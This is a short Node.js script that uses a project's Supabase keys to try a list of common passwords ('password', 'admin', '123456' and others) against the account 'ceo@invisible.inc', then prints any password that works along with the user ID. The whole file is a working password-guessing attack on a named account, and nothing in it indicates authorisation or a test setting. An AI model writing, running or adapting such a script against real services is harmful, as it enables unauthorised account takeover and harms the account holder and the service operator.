import { createClient } from '@supabase/supabase-js'
import dotenv from 'dotenv'
dotenv.config({ path: '.env.local' })

const supabase = createClient(process.env.NEXT_PUBLIC_SUPABASE_URL, process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY)

async function run() {
  const pwds = ['password', 'password123', 'admin', '123456', 'test1234']
  for (const p of pwds) {
      const { data, error } = await supabase.auth.signInWithPassword({ email: 'ceo@invisible.inc', password: p })
      if (data?.session) {
          console.log(`Success! Password is: ${p}`)
          console.log(`User ID: ${data.user.id}`)
          return
      }
  }
  console.log("Failed to guess password")
}
run()
